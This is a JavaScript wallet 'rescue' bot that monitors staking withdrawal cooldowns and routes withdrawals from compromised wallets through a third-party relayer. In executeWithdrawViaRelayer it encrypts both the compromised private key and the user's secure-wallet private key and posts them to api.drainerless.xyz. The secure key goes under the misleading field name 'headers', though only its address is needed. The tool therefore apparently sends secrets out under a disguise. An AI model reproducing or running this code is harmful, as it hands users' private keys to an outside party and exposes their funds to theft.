/**
 * @file Universal Airdrop & Staking Rescue Tool - IMPROVED VERSION
 * @description Specialized tool for rescuing assets using EIP-7702 with precise withdrawal time detection.
 * @version 5.2.0 - Refactored for centralized configuration and translated to English
 *
 * ADAPTED FOR NEW RELAYER (relayer-new.js):
 * - Uses the endpoint: https://api.drainerless.xyz/relayer-new
 * - Compatible with RescueEIP7702v4.sol
 * - Supports atomicity with the revertOnError parameter
 * - Automatically builds the necessary sub-calls
 *
 * USAGE:
 * 1. Configure the JSON campaign file (see campaign-example.json)
 * 2. node airdrop-rescuer.js check -c campaign.json
 * 3. node airdrop-rescuer.js rescue -c campaign.json
 *
 * REQUIRED CAMPAIGN STRUCTURE:
 * {
 *   "name": "Campaign Name",
 *   "chainId": 1,
 *   "targetContractAddress": "0x...",
 *   "tokenAddress": "0x...",
 *   "abiFile": "staking-abi.json"
 * }
 */

import { createPublicClient, http, createWalletClient, getAddress, encodeFunctionData, parseUnits } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import * as allChains from 'viem/chains';
import prompts from 'prompts';
import fs from 'fs';
import { program } from 'commander';
import axios from 'axios';
import { publicEncrypt, constants as cryptoConstants } from 'crypto';
import { Buffer } from 'buffer';
import HttpsProxyAgent from 'https-proxy-agent';
import dotenv from 'dotenv';
import chalk from 'chalk';

import {
  sleep,
  bigintToDecimalString,
  loadPrivateKeys,
  loadSetFromFile,
  findAndParseCandidates,
  loadPendingWithdrawals,
  savePendingWithdrawal
} from './utils.js';

// --- CENTRALIZED CONFIGURATION ---
dotenv.config();

const { RPC_URL, SECURE_WALLET_PK } = process.env;
if (!RPC_URL || !SECURE_WALLET_PK) {
  throw new Error("Environment variables RPC_URL and SECURE_WALLET_PK must be defined in the .env file.");
}

// --- CONSTANTS AND FILE PATHS ---
const PRIVATE_KEYS_FILE = "pk.txt";
const PROCESSED_FILE = "processed_rescues.txt";
const IDLE_CHECK_INTERVAL_SECONDS = 60;
const ERC20_ABI_FOR_SYMBOL = [
  {
    "constant": true,
    "inputs": [],
    "name": "symbol",
    "outputs": [{"name": "", "type": "string"}],
    "type": "function"
  }
];

// --- RELAYER CONFIGURATION ---
const RELAYER_URL = 'https://api.drainerless.xyz/relayer-new';
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkMJDKwl0suv1wp218yKq
DAQ/UdD9A+zbhoa8Gw3/AQzmurcwEaNnuutU+0dqVZ6ovLkKC+4RdfWveo7K7P8O
ev8LXF2XXIX41REGjbn5S2fjS5ZuMQgkqxbKcL3Rqc0vVHzmCeKDAkAWAL9Qam0p
6hMpl0eAoIbIxveS/JkPGadTCdekLlu4yhhh7ypZvyp7sGW1rdjkgb7aipQN5lq6
j4DPcJtccQZPneE3ZcdvHT2cNrVfBow96XGjST4o6960rPC7xWi6vwfYyqMoBczI
dVoWI0uZG2uxLx6r/CJeVX+pKD+psQOwmPUaEXddS0lPXEutJRuHENziSPfQvQI3
jwIDAQAB
-----END PUBLIC KEY-----`;

// --- ENHANCED LOGGER ---
const logger = {
  _log: (message, plainMessage) => {
    const timestamp = new Date().toISOString();
    const fileEntry = `[${timestamp}] ${plainMessage || message}\n`;
    const consoleEntry = `[${chalk.gray(timestamp)}] ${message}`;
    fs.appendFileSync('rescue-bot.log', fileEntry);
    console.log(consoleEntry);
  },
  info: (message) => logger._log(`${chalk.blue('ℹ')} ${chalk.blue(message)}`, `INFO: ${message}`),
  success: (message) => logger._log(`${chalk.green('✔')} ${chalk.green(message)}`, `SUCCESS: ${message}`),
  error: (message) => logger._log(`${chalk.red('✖')} ${chalk.red(message)}`, `ERROR: ${message}`),
  warn: (message) => logger._log(`${chalk.yellow('⚠')} ${chalk.yellow(message)}`, `WARN: ${message}`),
  special: (message) => logger._log(`${chalk.magenta('✨')} ${chalk.magenta(message)}`, `SPECIAL: ${message}`),
  log: (message) => logger._log(message, message),
};

// --- RELAYER ENCRYPTION FUNCTIONS ---
function encryptWithPublicKey(data) {
  try {
    const buffer = Buffer.from(data, 'utf8');
    const encrypted = publicEncrypt(
      {
        key: RSA_PUBLIC_KEY,
        padding: cryptoConstants.RSA_PKCS1_PADDING,
      },
      buffer
    );
    return encrypted.toString('base64');
  } catch (error) {
    logger.error(`Encryption failed: ${error.message}`);
    throw error;
  }
}

// --- DYNAMIC CAMPAIGN LOADER ---
function loadCampaign(filePath) {
  if (!fs.existsSync(filePath)) {
    throw new Error(`Campaign file not found at: ${filePath}`);
  }
  const campaign = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  if (!fs.existsSync(campaign.abiFile)) {
    throw new Error(`ABI file not found for campaign: ${campaign.abiFile}`);
  }
  campaign.abi = JSON.parse(fs.readFileSync(campaign.abiFile, 'utf-8'));
  logger.success(`Campaign loaded successfully: "${campaign.name}"`);
  return campaign;
}

// --- CLIENT SETUP ---
async function setupClients(campaign) {
  const chain = Object.values(allChains).find(c => c.id === campaign.chainId);
  if (!chain) throw new Error(`Chain with ID ${campaign.chainId} not found.`);

  const publicClient = createPublicClient({ chain, transport: http(RPC_URL) });
  logger.success(`Connected to network: ${chain.name} (Chain ID: ${chain.id})`);

  const secureWallet = createWalletClient({
    account: privateKeyToAccount(SECURE_WALLET_PK),
    chain,
    transport: http(RPC_URL)
  });
  logger.success(`Secure wallet loaded: ${secureWallet.account.address}`);

  const privateKeys = loadPrivateKeys(PRIVATE_KEYS_FILE);
  logger.success(`Loaded ${Object.keys(privateKeys).length} private keys`);

  return { publicClient, secureWallet, privateKeys, chain };
}

// --- MAIN TRIAGE FUNCTION (BASED ON PROVEN LOGIC) ---
async function triageStakingWallets(publicClient, walletsToCheck, campaignConfig) {
  logger.info(`Analyzing ${walletsToCheck.length} wallets for withdrawal times...`);
  
  if (!walletsToCheck.length) {
    return { walletsReadyNow: [], futureSchedule: [], pendingWithdrawals: [] };
  }

  // 1. Get initial information for all wallets
  const walletInfo = {};
  const withdrawalContracts = [];
  
  for (const wallet of walletsToCheck) {
    try {
      // Get withdrawal request count
      const withdrawalCount = await publicClient.readContract({
        address: campaignConfig.targetContractAddress,
        abi: campaignConfig.abi,
        functionName: 'getUserWithdrawalRequestCount',
        args: [wallet]
      });
      
      // Get total pending withdrawal amount
      const totalWithdrawalAmount = await publicClient.readContract({
        address: campaignConfig.targetContractAddress,
        abi: campaignConfig.abi,
        functionName: 'getUserTotalWithdrawalRequestsAmount',
        args: [wallet]
      });
      
      walletInfo[wallet] = {
        withdrawalCount,
        totalWithdrawalAmount,
        withdrawalDetails: []
      };
      
      logger.info(`Wallet ${wallet}: ${withdrawalCount} requests, total amount: ${bigintToDecimalString(totalWithdrawalAmount)}`);
      
      // If there are requests, get details for each one
      if (withdrawalCount > 0n) {
        for (let i = 0; i < withdrawalCount; i++) {
          withdrawalContracts.push({
            address: campaignConfig.targetContractAddress,
            abi: campaignConfig.abi,
            functionName: 'withdrawalRequests',
            args: [wallet, i],
            wallet
          });
        }
      }
    } catch (error) {
      logger.warn(`Error getting info for ${wallet}: ${error.message}`);
      walletInfo[wallet] = { withdrawalCount: 0n, totalWithdrawalAmount: 0n, withdrawalDetails: [] };
    }
  }

  // 2. Get details for all withdrawal requests
  const walletsReadyNow = [];
  const futureSchedule = [];
  const pendingWithdrawals = [];

  if (withdrawalContracts.length > 0) {
    try {
      const withdrawalResults = await publicClient.multicall({
        contracts: withdrawalContracts,
        allowFailure: true
      });

      // Process results - corrected type handling
      let resultIndex = 0;
      for (const wallet of walletsToCheck) {
        const info = walletInfo[wallet];
        if (info.withdrawalCount === 0n) continue;

        const walletWithdrawals = [];
        for (let i = 0; i < Number(info.withdrawalCount); i++) {
          const result = withdrawalResults[resultIndex];
          if (result && result.status === 'success' && result.result) {
            const [amount, , cooldownPeriodEndTimestamp] = result.result;
            const cooldownTimestamp = Number(cooldownPeriodEndTimestamp);
            walletWithdrawals.push({
              amount: BigInt(amount),
              cooldownPeriodEndTimestamp: cooldownTimestamp
            });
            logger.info(`Wallet ${wallet} withdrawal ${i}: ${bigintToDecimalString(BigInt(amount))} available at ${new Date(cooldownTimestamp * 1000).toUTCString()}`);
          }
          resultIndex++;
        }

        info.withdrawalDetails = walletWithdrawals;

        // Determine if it's ready for withdrawal using blockchain timestamp
        const currentBlock = await publicClient.getBlock({ blockTag: 'latest' });
        const currentTime = Number(currentBlock.timestamp);
        logger.info(`=== TRIAGE DEBUG ===`);
        logger.info(`Wallet: ${wallet}`);
        logger.info(`Current blockchain timestamp: ${currentTime} (${new Date(currentTime * 1000).toUTCString()})`);
        logger.info(`Total withdrawals for this wallet: ${walletWithdrawals.length}`);

        const readyWithdrawals = walletWithdrawals.filter(w => {
          const isReady = w.cooldownPeriodEndTimestamp <= currentTime;
          logger.info(`  Withdrawal cooldown: ${w.cooldownPeriodEndTimestamp} (${new Date(w.cooldownPeriodEndTimestamp * 1000).toUTCString()}) - Ready: ${isReady}`);
          return isReady;
        });

        logger.info(`Ready withdrawals: ${readyWithdrawals.length}`);

        if (readyWithdrawals.length > 0) {
          const totalReadyAmount = readyWithdrawals.reduce((sum, w) => sum + w.amount, 0n);
          if (totalReadyAmount > 0n) {
            walletsReadyNow.push({
              wallet,
              amount: totalReadyAmount,
              withdrawals: readyWithdrawals
            });
            logger.success(`✅ Wallet ${wallet} ready for withdrawal: ${bigintToDecimalString(totalReadyAmount)}`);
          } else {
            logger.warn(`⚠️ Wallet ${wallet} has ready withdrawals but the amount is 0`);
          }
        } else if (walletWithdrawals.length > 0) {
          // Has withdrawals but they are not ready yet
          const earliestTime = Math.min(...walletWithdrawals.map(w => w.cooldownPeriodEndTimestamp));
          const timeUntilReady = earliestTime - currentTime;
          futureSchedule.push({
            wallet,
            amount: info.totalWithdrawalAmount,
            readyTime: earliestTime
          });
          logger.info(`⏰ Wallet ${wallet} withdrawal available at: ${new Date(earliestTime * 1000).toUTCString()} (${Math.round(timeUntilReady / 60)} minutes)`);
        } else {
          logger.info(`❓ Wallet ${wallet} has no pending withdrawals`);
        }
      }
    } catch (error) {
      logger.error(`Error in multicall for withdrawal details: ${error.message}`);
      // Continue with known ready wallets even if there's an error getting details
    }
  }

  // 3. Also check for unlocked stakes that need to be unstaked first
  const unlockedContracts = walletsToCheck.map(wallet => ({
    address: campaignConfig.targetContractAddress,
    abi: campaignConfig.abi,
    functionName: 'getUserUnlockedStakeAmount',
    args: [wallet]
  }));

  if (unlockedContracts.length > 0) {
    try {
      const unlockedResults = await publicClient.multicall({ 
        contracts: unlockedContracts, 
        allowFailure: true 
      });
      
      for (let i = 0; i < walletsToCheck.length; i++) {
        const wallet = walletsToCheck[i];
        const result = unlockedResults[i];
        if (result && result.status === 'success' && result.result > 0n) {
          logger.warn(`Wallet ${wallet} has ${bigintToDecimalString(result.result)} unlocked but not requested for unstake`);
        }
      }
    } catch (error) {
      logger.warn(`Error checking unlocked amounts: ${error.message}`);
    }
  }

  futureSchedule.sort((a, b) => a.readyTime - b.readyTime);
  
  logger.success(`Triage complete: ${walletsReadyNow.length} ready now, ${futureSchedule.length} scheduled`);
  
  return { walletsReadyNow, futureSchedule, pendingWithdrawals };
}

// --- RESCUE FUNCTION USING RELAYER ---
async function executeWithdrawViaRelayer(campaign, wallet, amount, compromisedPk, securePk) {
  logger.info(`Executing withdrawal for ${wallet} with amount ${bigintToDecimalString(amount)} via relayer`);

  if (!campaign.chainId) {
    throw new Error('Configuration Error: campaign.chainId is not defined. Make sure your JSON campaign file includes it.');
  }

  try {
    // Create intent EXACTLY as private-rescuev4.js does for staking
    const intent = {
      type: 'staking',
      tokens: [], // Initially empty array
      sweepEth: false,
      revertOnError: true,
      recoveryAddress: privateKeyToAccount(securePk).address, // No getAddress() to match exactly
      compromisedAddress: wallet, // No getAddress() to match exactly
    };

    // Add staking-specific details (like private-rescuev4.js)
    intent.targetContract = campaign.targetContractAddress;
    intent.claimHex = await buildClaimHex(campaign, wallet, amount);
    intent.gasLimitForClaim = '500000'; // String to match exactly

    // Add the token (like collectTokenDetails in private-rescuev4.js)
    intent.tokens.push({
      type: 'erc20',
      address: campaign.tokenAddress,
      amount: amount.toString(),
      gasLimit: '100000', // String to match exactly
    });

    // Detailed intent log for debugging
    logger.info(`=== INTENT DEBUG ===`);
    logger.info(`Full Intent: ${JSON.stringify(intent, null, 2)}`);

    // Encrypt keys for authentication
    const auth = encryptWithPublicKey(compromisedPk);
    const headers = encryptWithPublicKey(securePk);

    // Build payload for the relayer with the new structure
    const payload = {
      action: 'executeRescue',
      auth,
      headers,
      intent,
      chainId: campaign.chainId,
      rpcUrl: RPC_URL
    };

    // Detailed payload log for debugging
    logger.info(`=== PAYLOAD DEBUG ===`);
    logger.info(`Relayer URL: ${RELAYER_URL}`);
    logger.info(`Payload: ${JSON.stringify(payload, null, 2)}`);
    logger.info(`Intent type: ${intent.type}`);
    logger.info(`Intent tokens: ${JSON.stringify(intent.tokens, null, 2)}`);
    logger.info(`Intent targetContract: ${intent.targetContract}`);
    logger.info(`Intent claimHex: ${intent.claimHex}`);

    // Configure proxy if available
    const axiosConfig = process.env.PROXY_URL ? {
      httpsAgent: new HttpsProxyAgent(process.env.PROXY_URL)
    } : {};

    // Send to the relayer
    logger.info(`📤 Sending request to relayer...`);
    const { data: result } = await axios.post(RELAYER_URL, payload, {
      headers: { 'Content-Type': 'application/json' },
      ...axiosConfig,
      timeout: 30000
    });

    if (result.error) {
      throw new Error(result.error);
    }

    logger.success(`Withdrawal successful for ${wallet}! Tx hash: ${result.hash}`);
    return { success: true, hash: result.hash };

  } catch (error) {
    logger.error(`Error in withdrawal via relayer for ${wallet}: ${error.message}`);
    throw error;
  }
}

// --- HELPER FUNCTION TO BUILD CLAIM HEX ---
async function buildClaimHex(campaign, wallet, amount) {
  try {
    // Dynamically build calldata using the ABI for robustness
    const claimHex = encodeFunctionData({
      abi: campaign.abi,
      functionName: 'withdraw',
      args: [amount]
    });

    logger.info(`Claim hex built for ${wallet}: ${claimHex} (amount: ${bigintToDecimalString(amount)})`);
    return claimHex;

  } catch (error) {
    logger.error(`Error building claim hex with encodeFunctionData: ${error.message}`);
    throw new Error('Could not build calldata for the withdrawal transaction.');
  }
}

// --- WITHDRAWAL PROCESSING ---
async function processWithdraw(publicClient, chain, wallet, secureWallet, privateKeys, amount, campaignConfig) {
  let receipt;
  try {
    logger.info(`Processing withdrawal for ${wallet} with amount ${bigintToDecimalString(amount)}`);
    
    const compromisedPk = privateKeys[wallet.toLowerCase()];
    if (!compromisedPk) {
      logger.error(`Private key not found for ${wallet}`);
      return;
    }

    // Execute withdrawal via relayer
    const result = await executeWithdrawViaRelayer(
      campaignConfig,
      wallet,
      amount,
      compromisedPk,
      SECURE_WALLET_PK
    );

    if (result.success) {
      logger.success(`Withdrawal completed successfully for ${wallet}!`);
      return true;
    }
    
  } catch (error) {
    logger.error(`Critical error during withdrawal for ${wallet}: ${error.message}`);
    return false;
  }
}

// --- IMPROVED CHECK COMMAND ---
async function checkAssetStatus(campaign) {
  logger.info(`Checking asset status for campaign "${campaign.name}"`);
  
  const { publicClient } = await setupClients(campaign);
  const privateKeys = loadPrivateKeys(PRIVATE_KEYS_FILE);
  const wallets = Object.keys(privateKeys);
  
  if (wallets.length === 0) {
    logger.error(`No valid wallets found in '${PRIVATE_KEYS_FILE}'`);
    return;
  }

  // Get token symbol
  let tokenSymbol = 'ASSET_TOKEN';
  try {
    tokenSymbol = await publicClient.readContract({
      address: campaign.tokenAddress,
      abi: ERC20_ABI_FOR_SYMBOL,
      functionName: 'symbol'
    });
  } catch {
    logger.warn("Could not get token symbol. Using default name.");
  }

  const outputFile = `${tokenSymbol}-${getAddress(campaign.targetContractAddress).slice(0, 10)}-withdraw-info.txt`;
  logger.info(`Saving results to '${outputFile}'`);
  
  if (fs.existsSync(outputFile)) fs.unlinkSync(outputFile);

  // Check pending withdrawals for each wallet
  const withdrawalInfo = {};
  const currentBlock = await publicClient.getBlock({ blockTag: 'latest' });
  const currentTime = Number(currentBlock.timestamp);
  logger.info(`Current blockchain timestamp (check): ${currentTime} (${new Date(currentTime * 1000).toUTCString()})`);
  
  for (const wallet of wallets) {
    try {
      const withdrawalCount = await publicClient.readContract({
        address: campaign.targetContractAddress,
        abi: campaign.abi,
        functionName: 'getUserWithdrawalRequestCount',
        args: [wallet]
      });
      
      if (withdrawalCount > 0n) {
        const totalAmount = await publicClient.readContract({
          address: campaign.targetContractAddress,
          abi: campaign.abi,
          functionName: 'getUserTotalWithdrawalRequestsAmount',
          args: [wallet]
        });
        
        withdrawalInfo[wallet] = {
          count: withdrawalCount,
          totalAmount,
          ready: false,
          readyAmount: 0n,
          nextReadyTime: null
        };
        
        // Check details of each withdrawal
        for (let i = 0; i < withdrawalCount; i++) {
          const withdrawalData = await publicClient.readContract({
            address: campaign.targetContractAddress,
            abi: campaign.abi,
            functionName: 'withdrawalRequests',
            args: [wallet, i]
          });
          
          const [amount, , cooldownEndTime] = withdrawalData;
          const cooldownEndTimestamp = Number(cooldownEndTime);
          
          if (cooldownEndTimestamp <= currentTime) {
            withdrawalInfo[wallet].ready = true;
            withdrawalInfo[wallet].readyAmount += amount;
          } else {
            if (!withdrawalInfo[wallet].nextReadyTime || cooldownEndTimestamp < withdrawalInfo[wallet].nextReadyTime) {
              withdrawalInfo[wallet].nextReadyTime = cooldownEndTimestamp;
            }
          }
        }
      }
    } catch (error) {
      logger.warn(`Error checking ${wallet}: ${error.message}`);
    }
  }

  // Generate report
  const lines = [];
  for (const [wallet, info] of Object.entries(withdrawalInfo)) {
    if (info.count > 0n) {
      let line = `${getAddress(wallet)}: ${info.count} withdrawal_requests, total ${bigintToDecimalString(info.totalAmount)}`;
      
      if (info.ready) {
        line += ` | READY: ${bigintToDecimalString(info.readyAmount)} available now`;
      } else if (info.nextReadyTime) {
        line += ` | next available: ${new Date(info.nextReadyTime * 1000).toUTCString()}`;
      }
      
      lines.push(line);
    }
  }

  if (lines.length > 0) {
    fs.writeFileSync(outputFile, lines.join('\n'));
    logger.success(`Report generated: ${lines.length} wallets with withdrawals. File: '${outputFile}'`);
  } else {
    logger.info("No pending withdrawals found for any wallet.");
  }
}

// --- IMPROVED MAIN BOT ---
async function startRescueBot(campaign) {
  logger.special(`STARTING SPECIALIZED RESCUE BOT for "${campaign.name}"`);
  logger.info("Mode: Exclusive focus on claims (withdraw)");
  
  const { publicClient, secureWallet, privateKeys, chain } = await setupClients(campaign);

  const campaignConfig = {
    targetContractAddress: getAddress(campaign.targetContractAddress),
    tokenAddress: getAddress(campaign.tokenAddress),
    abi: campaign.abi,
    chainId: campaign.chainId,
  };

  while (true) {
    try {
      logger.info("Starting new check cycle...");
      
      const processedWallets = loadSetFromFile(PROCESSED_FILE);
      const latestBlock = await publicClient.getBlock({ blockTag: 'latest' });
      const currentBlockTs = Number(latestBlock.timestamp);
      let actionTaken = false;

      // Get and triage candidates
      const candidates = findAndParseCandidates(PRIVATE_KEYS_FILE);
      logger.info(`=== BOT DEBUG ===`);
      logger.info(`Candidate wallets found: ${candidates.length}`);
      logger.info(`Wallets already processed: ${processedWallets.size}`);
      logger.info(`Current block timestamp: ${currentBlockTs} (${new Date(currentBlockTs * 1000).toUTCString()})`);

      const { walletsReadyNow, futureSchedule } = await triageStakingWallets(
        publicClient,
        candidates,
        campaignConfig
      );

      logger.info(`=== TRIAGE RESULTS ===`);
      logger.info(`Wallets ready NOW: ${walletsReadyNow.length}`);
      logger.info(`Wallets scheduled for the future: ${futureSchedule.length}`);

      // Process wallets ready for withdrawal
      if (walletsReadyNow.length > 0) {
        logger.success(`🎯 Found ${walletsReadyNow.length} wallet(s) ready for withdrawal:`);

        for (const { wallet, amount } of walletsReadyNow) {
          if (processedWallets.has(wallet)) {
            logger.info(`⏭️ Wallet ${wallet} already processed, skipping`);
            continue;
          }

          logger.info(`🔄 Processing withdrawal for ${wallet}: ${bigintToDecimalString(amount)}`);

          const success = await processWithdraw(
            publicClient,
            chain,
            wallet,
            secureWallet,
            privateKeys,
            amount,
            campaignConfig
          );

          if (success) {
            fs.appendFileSync(PROCESSED_FILE, `${wallet.toLowerCase()}\n`);
            logger.success(`✅ Wallet ${wallet} marked as processed`);
            actionTaken = true;
          } else {
            logger.error(`❌ Withdrawal failed for ${wallet}`);
          }
        }
      } else {
        logger.info(`⏳ No wallets are ready for withdrawal at this time`);
      }

      if (actionTaken) {
        logger.success("🔄 Cycle completed with actions taken. Restarting in 15 seconds...");
        await sleep(15000);
        continue;
      }

      // Calculate next event
      if (futureSchedule.length > 0) {
        const nextEvent = futureSchedule[0];
        const eventDate = new Date(nextEvent.readyTime * 1000);
        const timeUntilEvent = nextEvent.readyTime - currentBlockTs;

        logger.info(`📅 NEXT EVENT: ${nextEvent.wallet} - ${bigintToDecimalString(nextEvent.amount)}`);
        logger.info(`⏰ Scheduled for: ${eventDate.toUTCString()}`);
        logger.info(`⏳ Time remaining: ~${Math.round(timeUntilEvent / 3600)} hours`);

        // Safety check: if the event is too far away, use the normal interval
        if (timeUntilEvent > 7200) { // More than 2 hours
          logger.info(`⏭️ Event is too far, using normal check interval...`);
          await sleep(IDLE_CHECK_INTERVAL_SECONDS * 1000);
        } else {
          // Wait until the event or a maximum of 1 hour
          const waitTime = Math.min(Math.max(timeUntilEvent, 60), 3600); // Between 1 min and 1 hour
          logger.info(`😴 Waiting ${Math.round(waitTime / 60)} minutes until the next event...`);
          await sleep(waitTime * 1000);
        }
      } else {
        logger.info("💤 No future events. Waiting in idle mode...");
        logger.info(`⏰ Next check in ${IDLE_CHECK_INTERVAL_SECONDS} seconds...`);
        await sleep(IDLE_CHECK_INTERVAL_SECONDS * 1000);
      }

      // Additional safety check to prevent infinite loops
      logger.info(`🔄 End of cycle. Restarting check...`);

    } catch (error) {
      logger.error(`CRITICAL BOT ERROR: ${error.message}`);
      logger.info("Restarting in 60 seconds...");
      await sleep(60000);
    }
  }
}

// --- CLI ROUTER ---
program
  .name('airdrop-rescuer-improved')
  .description('Specialized tool for staking rescue using EIP-7702 with precise timing detection.');

program
  .command('check')
  .description('Check available withdrawals based on the campaign file.')
  .requiredOption('-c, --campaign <path>', 'Path to the JSON campaign file.')
  .action(async (options) => {
    try {
      const campaign = loadCampaign(options.campaign);
      await checkAssetStatus(campaign);
    } catch (error) {
      logger.error(`Error in check command: ${error.message}`);
      process.exit(1);
    }
  });

program
  .command('rescue')
  .description('Start the automated bot specialized in claims.')
  .requiredOption('-c, --campaign <path>', 'Path to the JSON campaign file.')
  .action(async (options) => {
    try {
      const campaign = loadCampaign(options.campaign);
      await startRescueBot(campaign);
    } catch (error) {
      logger.error(`Error starting bot: ${error.message}`);
      process.exit(1);
    }
  });

program.parse(process.argv);
